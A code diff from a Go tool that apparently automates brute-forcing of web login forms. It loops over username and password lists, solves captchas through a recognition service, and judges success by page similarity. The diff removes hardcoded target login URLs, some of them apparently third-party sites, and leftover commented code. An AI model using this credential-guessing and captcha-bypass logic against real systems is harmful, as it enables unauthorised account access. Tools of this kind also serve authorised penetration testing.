@@ -11,10 +11,8 @@ import (
 
 func BruteForce(urlStr string) {
 	if urlStr == "" {
-		urlStr = "http://192.168.0.80/member.php?c=login"
-		//urlStr = "http://vip.hzxy999.com/admin/login/login.html"
-		//urlStr = "http://121.42.174.241:8087/login"
-		//urlStr = "http://192.168.0.68:18000/#/login"
+		log.Errorf("url not null")
+		return
 	}
 	log.Infof("### bruteforce example ###")
 	log.Infof("### target url: %s", urlStr)
@@ -65,7 +63,6 @@ func BruteForce(urlStr string) {
 	capmodule := extend.CreateCaptcha()
 	var captchaimgelement *core.GeneralElement
 	if captchaelement != nil {
-		//capmodule.SetIdentifyUrl("http://101.35.184.3:19199/runtime/text/invoke")
 		capmodule.SetIdentifyUrl("http://192.168.0.68:8008/runtime/text/invoke")
 		capmodule.SetRequestStruct(&extend.CaptchaRequest{})
 		capmodule.SetResponseStruct(&extend.CaptchaResult{})
@@ -278,15 +275,7 @@ func BruteForceModule(urlStr string, usernameList, passwordList []string, captch
 				capModule,
 				originHtml, username, password,
 			)
-			//switch err.(type) {
-			//case *WrongUsernamePasswordError:
-			//	continue
-			//case error:
-			//	return "", "", ""
-			//}
 			if err == nil {
-				//log.Info("end!")
-				//log.Info(b64)
 				return username, password, b64
 			}
 		}
@@ -340,7 +329,6 @@ func pageInfoCollection(page *core.GeneralPage) (
 	capmodule := extend.CreateCaptcha()
 	var captchaimgelement *core.GeneralElement
 	if captchaelement != nil {
-		//capmodule.SetIdentifyUrl("http://101.35.184.3:19199/runtime/text/invoke")
 		capmodule.SetIdentifyUrl("http://192.168.0.68:8008/runtime/text/invoke")
 		capmodule.SetRequestStruct(&extend.CaptchaRequest{})
 		capmodule.SetResponseStruct(&extend.CaptchaResult{})
@@ -391,7 +379,6 @@ func inputClickTry(
 		}
 		captchaElement.Input(capStr)
 	}
-	//page.Screenshot("1.png")
 	err := page.StartListen()
 	if err != nil {
 		log.Info("start listen err: %s", err)
@@ -411,7 +398,6 @@ func inputClickTry(
 		words = words[:500]
 		words = append(words, 46, 46, 46)
 	}
-	//page.Screenshot("test.png")
 	currentHtml := page.HTML()
 	degree := extend.GetPageSimilarity(originHtml, currentHtml)
 	log.Info("current page similarity degree: ", degree)
